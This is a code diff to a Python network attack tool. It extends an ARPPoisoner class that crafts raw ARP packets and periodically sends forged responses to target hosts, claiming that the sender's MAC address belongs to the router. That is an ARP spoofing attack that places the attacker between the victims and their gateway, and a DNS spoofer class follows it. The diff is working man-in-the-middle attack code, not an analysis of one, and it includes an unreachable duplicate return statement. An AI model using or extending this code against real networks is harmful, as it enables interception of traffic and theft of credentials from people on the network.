@@ -1191,7 +1191,8 @@ class ARPPoisoner(Thread):
     super().__init__()
     self.context = context
     self.running = False
-    self.last_router_adress_update = 0
+    self.last_ask_targets_mac = 0
+    self.last_send_i_is_the_rooter = 0
 
   def run(self):
     self.create_device_socket()
@@ -1225,15 +1226,18 @@ class ARPPoisoner(Thread):
     self.ctx = TmpCtx()
     s.settimeout(1)
     while self.running:
+      if self.context.options.router_mac is None:
+        self.update_router_adress()
+      self.ask_targets_mac()
+      self.send_i_is_the_rooter()
       try:
-        if self.context.options.router_mac is None:
-          self.update_router_adress()
+        ## we process packets until there are no packet anymore.
         packet = s.recvfrom(65565)[0]
         packet = Layer4(packet)
         if packet.contains_arp:
           self.process_arp(packet)
       except socket.timeout:
-        continue
+        pass
       except KeyboardInterrupt:
         self.stop()
 
@@ -1256,84 +1260,132 @@ class ARPPoisoner(Thread):
     )
 
   def update_router_adress(self):
+    ## we ask router's mac address once per hour.
+    ## this should not change frequently
     if time.time() - self.context.last_router_mac_update > 3600:
       arp_logger.info("Periocical update of the router's MAC adress.")
       self.send_router_arp_query()
 
+  def ask_targets_mac(self):
+    ## we ask the targets' mac address once per hour.
+    ## this should not change frequently
+    if time.time() - self.last_ask_targets_mac > 3600:
+      self.last_ask_targets_mac = time.time()
+      arp_logger.info("Periocical update of the targets' MAC adress.")
+      self.send_targets_arp_query()
+
   def send_router_arp_query(self):
-    arp_logger.info(
-      "Sending ARP Request for router [IP=%s]." % self.context.router_ip
+    router_mac = self.context.arp_table.get(
+      self.context.router_ip, None
     )
-    raw_mac_source = pack("!6B", *[
-      int(x, 16)for x in self.context.mac.split(':')
-    ])
-    raw_ip_target = pack("!4B", *map(
-      int, self.context.router_ip.split('.')
-    ))
-    raw_ip_source = pack("!4B", *map(
-      int, self.context.ip.split('.')
-    ))
-    arp = Layer4()
-    arp.eth_mac_target = BROADCAST_MAC
-    arp.eth_mac_source = raw_mac_source
-    arp.eth_data_protocol = Layer3.ARP
-    arp.arp_network_type = Layer4.ETHERNET
-    arp.arp_protocol_type = Layer3.IPV4
-    arp.arp_hw_addr_length = pack("!B", 0x0006)
-    arp.arp_sw_addr_length = pack("!B", 0x0004)
-    arp.arp_operation = Layer4.ARP_REQUEST
-    arp.arp_mac_source = raw_mac_source
-    arp.arp_ip_source = raw_ip_source
-    arp.arp_mac_target = EMPTY_MAC
-    arp.arp_ip_target = raw_ip_target
-    self.device_socket.send(arp.raw_data)
+    self.send_arp(
+      (self.context.ip, self.context.mac),
+      (self.context.router_ip, router_mac)
+    )
+
+  def send_targets_arp_query(self):
+    targets = self.context.targets_ips
+    if targets is None:
+      targets = [(self.context.broadcast_ip, self.context.broadcast_mac)]
+    else:
+      targets = [
+        (target, self.context.arp_table.get(target, self.context.broadcast_mac))
+        for target in targets - {self.context.router_ip, self.context.ip}
+      ]
+    source = self.context.ip, self.context.mac
+    for target in targets:
+      self.send_arp(source, target)
 
   def process_arp(self, packet):
+    self.init_tmp_ctx(packet)
     if packet.is_arp_request:
       self.process_arp_request(packet)
     else:
       self.process_arp_response(packet)
 
   def process_arp_request(self, packet):
-    if socket.inet_ntoa(packet.arp_ip_source) == self.context.ip:
-      filtered = ""
-    else:
-      filtered = " [FILTERED (TODO)]"
-    arp_logger.info("%s[%s] asks who is %s ? %s" % (
-      socket.inet_ntoa(packet.arp_ip_source),
-      printable_mac(packet.eth_mac_source),
-      socket.inet_ntoa(packet.arp_ip_target),
-      filtered
+    arp_logger.info("%s[%s] asks who is %s[%s] ?" % (
+      self.ctx.source_ip, self.ctx.source_mac,
+      self.ctx.target_ip, self.ctx.target_mac
     ))
 
   def process_arp_response(self, packet):
-    ip_source = socket.inet_ntoa(packet.arp_ip_source)
-    mac_source = printable_mac(packet.eth_mac_source)
-    if ip_source == self.context.router_ip:
-      self.context.arp_table[ip_source] = (mac_source, time.time())
+    if self.ctx.source_ip == self.context.router_ip \
+        or self.context.is_valid_target((self.ctx.source_ip, None)):
+      self.context.arp_table[self.ctx.source_ip] = (
+        self.ctx.source_mac, time.time()
+      )
       stored = " [STORED]"
     else:
       stored = ""
     arp_logger.info("%s is at %s" % (
-      ip_source, mac_source
+      self.ctx.source_ip, self.ctx.source_mac
     )+stored)
 
   def send_i_is_the_rooter(self):
-    for mac, ip in self.context.targets:
-      arp_logger.info("Sending fake ARP to %s[%s]." % (ip, mac))
-      self.device_socket.send(
-        self.craft_i_is_router_arp_response(mac, ip)
+    if time.time() - self.last_send_i_is_the_rooter < self.context.options.arp_elapse_time:
+      return
+    self.last_send_i_is_the_rooter = time.time()
+    targets = self.context.targets_ips
+    if targets is None:
+      targets = [(self.context.broadcast_ip, self.context.broadcast_mac)]
+    else:
+      targets = [
+        (target, self.context.arp_table.get(target, [None])[0])
+        for target in targets - {self.context.router_ip, self.context.ip}
+      ]
+    for target in targets:
+      self.tell_I_is_router_to(*target)
+
+  def tell_I_is_router_to(self, ip, mac=None):
+    if mac is not None:
+      return self.send_arp(
+        (self.context.router_ip, self.context.mac), (ip, mac),
+        kind="response"
+      )
+      return self.send_arp(
+        (self.context.router_ip, self.context.router_mac), (ip, mac),
+        fake_mac=self.context.mac,
+        kind="response"
+      )
+    else:
+      return self.send_arp(
+        (self.context.ip, self.context.mac), (ip, self.context.broadcast_mac),
       )
 
-  def craft_i_is_router_arp_response(self, mac, ip):
-    self.create_no_fake_arp()
-
-  def create_no_fake_arp(self):
-    packet = ARPPacket()
-    packet.sender_ip = self.context.ip
-
-  def forward_to_router(self, packet):
-    arp_logger.info("Forwarding packet to router...")
+  def send_arp(self, source, target, fake_mac=None, kind="query"):
+    ip_source, mac_source = source
+    ip_target, mac_target = target
+    arp_logger.info(
+      "Sending ARP %s to %s[%s] as %s[%s]." % (
+        kind,
+        ip_target, mac_target,
+        ip_source, mac_source,
+      )
+    )
+    arp = Layer4()
+    arp.eth_mac_target = mac_to_raw(mac_target)
+    arp.eth_mac_source = mac_to_raw(mac_source)
+    arp.eth_data_protocol = Layer3.ARP
+    arp.arp_network_type = Layer4.ETHERNET
+    arp.arp_protocol_type = Layer3.IPV4
+    arp.arp_hw_addr_length = pack("!B", 0x0006)
+    arp.arp_sw_addr_length = pack("!B", 0x0004)
+    if kind == "query":
+      arp.arp_operation = Layer4.ARP_REQUEST
+    else:
+      arp.arp_operation = Layer4.ARP_RESPONSE
+    arp.arp_mac_source = mac_to_raw(mac_source)
+    arp.arp_ip_source = ip_to_raw(ip_source)
+    if fake_mac is None:
+      if mac_target == self.context.broadcast_mac:
+        arp.arp_mac_target = EMPTY_MAC
+      else:
+        arp.arp_mac_target = mac_to_raw(mac_target)
+    else:
+      arp.arp_mac_target = mac_to_raw(fake_mac)
+    arp.arp_ip_target = ip_to_raw(ip_target)
+    self.device_socket.send(arp.raw_data)
 
 
 class DNSSpoofer(object):
